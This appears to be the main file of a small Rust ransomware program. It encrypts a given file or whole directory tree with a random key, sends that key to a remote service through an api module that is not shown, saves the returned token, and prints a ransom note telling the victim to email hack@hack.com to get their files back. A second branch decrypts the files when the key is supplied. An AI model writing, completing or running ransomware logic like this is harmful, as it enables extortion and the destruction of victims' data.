mod api;

use std::path::PathBuf;
use rand::prelude::*;

#[tokio::main]
async fn main() {
    let args = api::get_args(); 
    let key: Option<String> = args.get_one("key").cloned(); 

    let stored_token_path =PathBuf::from("./token.txt"); 
    let stored_token = api::get_stored_token(&stored_token_path);

    let path_to_file = PathBuf::from(args.get_one::<String>("file").expect("File not provided"));
    let meta = std::fs::metadata(&path_to_file).expect("Error reading file"); 

    if !stored_token.is_empty() && !key.is_none() {
        let _ = run(&meta, &path_to_file, &key.unwrap().as_str()); 
        println!("Your files are now back, be more careful in the future.")
    } else if stored_token.is_empty() {
        let random_key = rand::thread_rng().next_u64().to_string();
        let _ = run(&meta, &path_to_file, &random_key);  

        let response = api::get_token(&random_key).await; 
        let token = response.unwrap().text().await.unwrap();
        std::fs::write(&stored_token_path, &token).expect("Failed to store token");

        print_message(&token);
    }
}

fn run(meta: &std::fs::Metadata, path_to_file: &PathBuf, key: &str) -> std::result::Result<(), std::io::Error>  {
    if meta.is_dir() {
        let func = Box::new(|path_to_file| api::run_operation(&path_to_file, key));
        api::walk_directory(&path_to_file, &func)
    } else {
        api::run_operation(&path_to_file, key)
    }
}
 

fn print_message(token: &str) {
    println!("Send the following token to hack@hack.com to get your files back: {token}");
}

